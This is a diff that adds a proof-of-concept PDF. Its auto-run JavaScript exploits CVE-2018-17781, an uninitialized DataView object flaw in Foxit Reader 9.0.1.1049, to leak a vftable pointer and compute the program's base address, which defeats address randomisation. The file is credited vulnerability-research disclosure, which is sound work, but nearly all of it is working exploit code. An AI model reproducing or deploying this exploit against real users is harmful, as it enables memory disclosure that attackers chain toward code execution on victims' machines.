@@ -1,0 +1,32 @@
+%PDF 
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>> 
+2 0 obj
+<</S /JavaScript /JS (
+
+/*
+
+Foxit Reader DataView Uninitialized Object Information Disclosure Vulnerability
+Found by: Steven Seeley (mr_me) of Source Incite
+CVE-2018-17781 / SRC-2018-0027
+
+*/
+
+var a = this.addAnnot({type: "Text", page: 0, name: "leak"});
+a.destroy();
+var buffer = new ArrayBuffer(0x60);
+var view = new DataView(buffer);
+
+var vftable = 0;
+vftable += view.getInt8(3) * 0x1000000;
+vftable += view.getInt8(2) * 0x10000;
+vftable += view.getInt8(1) * 0x100;
+vftable += view.getInt8(0);
+
+var leaked = vftable & 0xffff0000;
+
+// foxit 9.0.1.1049 offset
+var foxitbase = leaked-0x01f50000;
+app.alert(util.printf("FoxitReader base address: 0x%08x", foxitbase));
+
+)>> trailer <</Root 1 0 R>>
